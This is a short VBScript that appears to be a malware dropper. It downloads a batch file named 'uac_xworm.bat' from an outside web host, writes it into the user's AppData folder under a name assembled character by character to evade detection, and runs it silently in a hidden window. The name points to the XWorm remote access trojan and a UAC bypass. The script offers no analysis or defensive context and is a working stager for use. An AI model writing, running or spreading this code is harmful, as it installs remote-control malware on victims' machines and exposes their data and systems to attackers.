Dim a, b, c, d, e, f, g, h, i
Set a = CreateObject("Microsoft.XMLHTTP")
a.Open "GET", "https://web-arc.netlify.app/legion/uac_xworm.bat", False
a.Send

If a.Status = 200 Then
    Set b = CreateObject("Scripting.FileSystemObject")
    Set c = CreateObject("WScript.Shell")
    d = c.ExpandEnvironmentStrings("%appdata%")
    Set e = b.CreateTextFile(d & Chr(92) & "s" & "e" & "l" & "l" & "s.bat", True)
    e.Write a.ResponseText
    e.Close
    c.Run """" & d & Chr(92) & "sells.bat""", 0, False
End If
